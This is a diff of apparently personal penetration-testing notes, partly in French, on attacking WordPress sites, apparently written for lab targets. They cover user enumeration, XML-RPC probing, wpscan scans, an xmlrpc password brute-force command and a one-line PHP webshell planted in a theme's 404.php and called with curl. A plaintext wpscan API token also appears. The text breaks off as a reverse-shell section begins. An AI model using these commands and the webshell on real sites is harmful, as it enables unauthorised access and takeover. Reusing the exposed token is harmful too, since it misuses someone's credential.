@@ -1,14 +1,64 @@
-# Outils
-## wpscan
-nécessite une clef d'API
+## Structure
+- `index.php` is the homepage of WordPress. 
+- `license.txt` contains useful information such as the version WordPress installed.
+- `wp-activate.php` is used for the email activation process when setting up a new WordPress site.
+- `wp-admin` Dossier pour authentification d'admin    
+    - `/wp-admin/login.php`
+    - `/wp-admin/wp-login.php`
+    - `/login.php`
+    - `/wp-login.php`
+- `wp-config.php` Contient information de base de donné et autres creds
+- `wp-content` Plugins et thèmes
+	- `/uploads/` contient fichiers téléversés
+- `wp-includes` Fichiers core pour fonctionnement du site. Certificats, polices, javascript scripts, ... 
+
+## Rôles
+|Role|Description|
+|---|---|
+|Administrator|This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.|
+|Editor|An editor can publish and manage posts, including the posts of other users.|
+|Author|Authors can publish and manage their own posts.|
+|Contributor|These users can write and manage their own posts but cannot publish them.|
+|Subscriber|These are normal users who can browse posts and edit their profiles.|
+
+## Énumération
+Plugins et thèmes peuvent être référencés dans le code source des pages.
+### Usagers
+* Peuvent se trouver dans le code source, ex auteur d'un post.
+* `http://blog.inlanefreight.com/?author=1` avec l'ID d'un usager donne le nom dans l'en-tête `location`
+* `http://blog.inlanefreight.com/wp-json/wp/v2/users` Liste les usagers. seulement version 4.7.1 et avant.
+
+### méthodes XML RPC
+```shell
+curl -d '<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' -X POST http://94.237.59.63:37311/xmlrpc.php
+```
+
+## Outils
+### wpscan
+Clef d'API: `dQMWw0YyXMllIXskZ0UGLbmJ4rMd3oQFQc821oYwr8E`
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell 
 wpscan --api-token dQMWw0YyXMllIXskZ0UGLbmJ4rMd3oQFQc821oYwr8E --url http://alvida-eatery.org
 wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan --api-token dQMWw0YyXMllIXskZ0UGLbmJ4rMd3oQFQc821oYwr8E
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## Brute force mot de passe
+xmlrpc est plus rapide que la page de login
+```shell
+wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
+```
 
-# Escalade de privilèges
-## Reverse Shell
+## Escalade de privilèges
+### webshell
+Choisir un thème non utilisé et une page non importante comme 404.
+```php
+<?php
+
+system($_GET['cmd']);
+```
+```shell
+curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
+```
+### Reverse Shell
 https://systemweakness.com/how-to-get-a-reverse-shell-from-any-wordpress-d12e2f7a3033
 Remplacer la page .php d'un des thèmes par:
 
